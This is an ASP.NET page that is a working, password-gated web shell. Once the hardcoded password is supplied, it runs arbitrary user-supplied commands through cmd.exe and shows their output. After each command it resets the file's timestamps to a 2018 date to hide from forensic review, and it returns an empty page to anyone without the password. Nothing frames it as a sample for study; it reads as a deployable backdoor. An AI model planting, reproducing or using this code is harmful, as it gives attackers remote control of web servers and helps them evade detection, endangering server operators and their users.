<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["password"] != null && Request["password"] == "28112016")
        {
            string lastCommand = Request["execute"] ?? ""; // احفظ آخر أمر مدخل

            Response.Write(@"
                <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #333; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.5); color: #f5f5f5;'>
                    <form method='get' style='display: flex; align-items: center;'>
                        <label for='commandInput' style='margin-right: 10px; font-weight: bold;'>Command:</label>
                        <input type='text' id='commandInput' name='execute' style='flex: 1; padding: 10px; border: none; border-radius: 5px; font-size: 16px;' value='" + Server.HtmlEncode(lastCommand) + @"' />
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' value='Execute' style='margin-left: 15px; padding: 10px 20px; border: none; border-radius: 5px; background-color: #4CAF50; color: #fff; font-size: 16px; cursor: pointer;' />
                    </form>
                </div>
                <div style='margin-top: 120px; padding: 20px;'>
            ");

            if (!string.IsNullOrEmpty(lastCommand))
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + lastCommand;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + output + "</pre>");
                    if (!string.IsNullOrEmpty(error))
                    {
                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + error + "</pre>");
                    }

                    string filePath = Server.MapPath(Request.Path);
                    System.IO.File.SetCreationTime(filePath, new DateTime(2018, 11, 15));
                    System.IO.File.SetLastWriteTime(filePath, new DateTime(2018, 11, 15));
                    System.IO.File.SetLastAccessTime(filePath, new DateTime(2018, 11, 15));
                }
                catch (Exception ex)
                {
                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre; word-wrap: normal;'>Error: " + ex.Message + "</pre>");
                }
            }

            Response.Write("</div>");
        }
        else
        {
            Response.Clear();
        }
    }
</script>

<html>
<head>
    <style>
        body {
            background-color: #2c2c2c;
            color: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        input[type='text'] {
            transition: box-shadow 0.3s ease;
        }

        input[type='text']:focus {
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
        }

        input[type='submit'] {
            transition: background-color 0.3s ease;
        }

        input[type='submit']:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
</body>
</html>
